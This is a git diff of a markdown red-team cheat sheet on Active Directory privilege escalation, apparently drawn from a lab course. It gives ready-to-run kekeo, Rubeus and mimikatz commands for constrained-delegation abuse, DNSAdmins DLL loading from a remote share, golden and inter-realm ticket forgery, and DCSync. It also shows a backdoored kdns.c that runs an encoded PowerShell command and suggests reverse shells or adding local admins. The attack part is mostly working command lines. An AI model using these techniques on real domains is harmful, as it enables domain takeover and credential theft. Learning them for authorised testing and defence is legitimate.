@@ -339,17 +339,18 @@ We can use `asktgt` from `kekeo` to request a TGT.
 ```
 .\kekeo.exe
 
-tgt::ask /user:websvc /domain
+kekeo # tgt::ask /user:websvC /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156f
 ```
 Once we have the TGT, with kekeo we can request a TGS.
 
 ```
-tgt::s4u /tgt:TGT_websvc@CORP.LOCAL_krbtgt~corp.local@corp.local.kirbi /user:Administrator@corp.local /service:cifs/mssql.corp.local
+kekeo # tgs::s4u /tgt:TGT_websvC@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.local|host/dcorp-mssql.dollarcorp.moneycorp.local
+
 ```
 Finally with mimikatz we can inject the ticket on the current session:
 
 ```
-Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@corp.local@CORP.LOCAL_cifs~mssql.corp.local@CORP.LOCAL.kirbi"'
+.\Rubeus.exe ptt /ticket:TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_host~dcorp-mssql.dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi
 ```
 
 > **Note**: The delegation occurs not only for the specified service but for any service running under the same account. The is no validation for the SPN specified.
@@ -357,6 +358,7 @@ Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@corp.local@CORP.LOCAL
 So we can ask for other service on a machine, in case of having Constrained delegation on the DC we can ask to the LDAP TGS in order to do a DCSync attack.
 
 * Rubeus
+
 ```
 .\Rubeus.exe asktgt /user:DCORP-ADMINSRV$ /rc4:5e77978a734e3a7f3895fb0fdbda3b96 /outfile:ADMINSRV-TGT.kirbi
 
@@ -383,6 +385,8 @@ It is possible for the members of the **DNSAdmins** group to load arbitrary DLL 
 
 In case the domain controllers also serves as DNS, this will provide us escalation to domain admin. We just need privileges to restart the DNS service.
 
+> **Note**: By default does not have the privileges to restart the DNS service.
+
 Enumerate the `DNSAdmins` group:
 
 * PowerView:
@@ -403,7 +407,7 @@ After compromise a member and from the privileges of DNSAdmins group, we can con
 dnscmd dc01 /config /serverlevelplugindll \\10.10.10.10\share\mimilib.dll
 ```
 
-* DNSServer:
+* DNSServer Module (RSAT DNS):
 ```
 $dnsettings = Get-DnsServerSetting -ComputerName dc01 -Verbose -All
 $dnsettings.ServerLevelPluginDll = "\\10.10.10.10\share\mimilib.dll"
@@ -422,9 +426,9 @@ By default `mimilib.dll` logs all DNS queries on the following file:
 c:\windows\sytem32\kiwidns.log
 ```
 
-We can modify the source code of `kdns.c` from `mimikatz` in order to add a reverse shell or other type of backdoor.
+We can modify the source code of `kdns.c` from `mimikatz` source code in order to add a reverse shell or other type of backdoor.
 
-```csharp
+```c
 #pragma warning(disable:4996)
 	if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
 #pragma warning(pop)
@@ -434,4 +438,94 @@ We can modify the source code of `kdns.c` from `mimikatz` in order to add a reve
 		system("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -e ZQBjAGgAbwAgACIAdABlAHMAdAAiAA==")   //THIS LINE
 	}
 	return ERROR_SUCCESS;
+```
+
+> **RedTeam Note**: If we put a reverse shell on the `mimilib.dll`, **DNS will not work properly since the reverse shell is closed**. Use another way to elevate privileges such as add the user to local administrators group.
+
+
+# Across Domains
+
+Domains in a same forest have an implicit two-way trust with other domains. There is a trust key between the parent and child domains.
+
+There are two ways of escalating privileges between two domains of the same forest:
+
+* Trust Tickets
+* Krbtgt hash
+
+## Child to Parent using Trust Tickets (SID History)
+
+We can escalate between domains using the trust tickets. An **inter-realm TGT** can be forged:
+
+```powershell
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:sub.corp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:05749eb179dbf3d3445e0a49d6701578 /service:krbtgt /targe
+t:corp.local /ticket:C:\temp\trust_forest_tkt.kirbi"'
+```
+We are going to inject the SID History inse the inter-realm TGT which will be requestes to the parent domain DC. The ticket will look like that comes from the Enterprise Admins group which allows us to elevate privileges.
+
+* **Invoke-Mimikatz**
+
+|                   **Parameter**                   |                 **Description**                |
+|:-------------------------------------------------:|:----------------------------------------------:|
+| /domain:sub.corp.local                            | Current Domain FQDN                            |
+| /sid:S-1-5-21-268341927-4156873456-1784235843     | Current Domain SID                             |
+| /sids:S-1-5-21-280534878-1496970234-700767426-519 | SID of Enterprise Admins group (Parent Domain) |
+| /rc4:05749eb179dbf3d3445e0a49d6701578             | RC4 of the trust key (parent$)                 |
+| /user:Administrator                               | User to impersonate                            |
+| /service:krbtgt                                   | Target service in the parent domain            |
+| /target:corp.local                                | Parent Domain FQDN                             |
+| /tiket:C:\Windows\Temp\trust_tkt.kirbi            | File to store the ticket                       |
+
+
+Once we have the inter-realm TGT ticket forged we can ask for a TGS on the parent domain. We can ask a TGS for LDAP on the parent DC.
+
+* asktgs.exe (kekeo_old)
+```
+.\asktgs.exe ./trust_tkt.kirbi LDAP/corp-dc.corp.local
+```
+
+* Rubeus.exe
+```
+.\Rubeus.exe asktgs /ticket:trust_tkt.kirbi /dc:corp-dc.corp.local /service:LDAP/corp-dc.corp.local /ptt
+```
+
+Finally we can inject in on the current session:
+
+```powershell
+.\Rubeus.exe ptt /ticket:LDAP.mcorp-dc.moneycorp.local.kirbi
+```
+
+And execute a DCSync attack and Over-Pass-The-Hash to fully control the DC of the parent domain:
+
+```powershell
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:mcorp\Administrator /domain:moneycorp.local"'
+.\Rubeus.exe asktgt /domain:corp.local /user:Administrator /rc4:71d04f9d50ceb1f64de7a09f23e6dc4c /dc:corp-dc.moneycorp.local /ptt
+Enter-PSSession -ComputerName corp-dc.moneycorp.local
+```
+
+## Child to Parent using krbtgt hash
+
+We can also escalate to the root domain with the krbtgt hash of the current domain.
+
+```powershell
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:sub.corp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:a9b30e5b0dc865eadcea9411e4ade72d /ticket:C:\temp\trust_forest_tkt.kirbi"'
+```
+* **Invoke-Mimikatz**
+
+|                   **Parameter**                   |                 **Description**                |
+|:-------------------------------------------------:|:----------------------------------------------:|
+| /domain:sub.corp.local                            | Current Domain FQDN                            |
+| /sid:S-1-5-21-268341927-4156873456-1784235843     | Current Domain SID                             |
+| /sids:S-1-5-21-280534878-1496970234-700767426-519 | SID of Enterprise Admins group (Parent Domain) |
+| /user:Administrator                               | User to impersonate                            |
+| /krbtgt:a9b30e5b0dc865eadcea9411e4ade72d          | krbtgt hash of Current Domain                  |
+| /tiket:C:\Windows\Temp\trust_tkt.kirbi            | File to store the ticket                       |
+
+
+
+Once created we can import and we don't need to ask for a TGS.
+
+```
+.\Rubeus.exe ptt /ticket:trust_forest_tkt.kirbi
+
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:mcorp\Administrator /domain:moneycorp.local"'
 ```
